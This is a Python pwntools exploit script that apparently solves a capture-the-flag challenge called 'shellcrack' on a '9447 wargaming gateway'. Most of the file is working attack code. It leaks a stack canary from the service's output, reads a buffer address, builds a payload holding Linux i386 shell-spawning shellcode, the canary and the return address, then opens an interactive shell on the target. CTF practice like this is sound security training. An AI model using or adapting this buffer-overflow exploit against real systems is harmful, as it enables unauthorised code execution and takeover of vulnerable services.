#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./shellcrack --host localhost --port 6002
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./shellcrack')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 6002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x080487b0
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments


def sendEmptylines(conn,count):
	#for i in range(count):
	conn.send(cyclic(16))
	#conn.sendline('')

io = start()


sendEmptylines(io,16);
canaryLine = io.recvline_endswith('!');
print(canaryLine)
print(canaryLine[len('This is the 9447 wargaming gateway, ')+16:-1])
addressLine = io.recvline()
print(addressLine)

shellcode = asm(shellcraft.i386.linux.sh())
address = p32(int(addressLine[len('Write your data to the buffer['):-3],16))
canary = canaryLine[len('This is the 9447 wargaming gateway, ')+16:-1]

#print(len(shellcode))
#print(len(canary))
#print(len(address))
payload = fit({4:shellcode,48:canary,76:address}, filler='\x90',length=80)
#payload = cyclic(48) + canaryLine[len('This is the 9447 wargaming gateway, ')+16:-1]+ cyclic(18)+
io.sendline(payload)
#print(payload)
io.interactive()
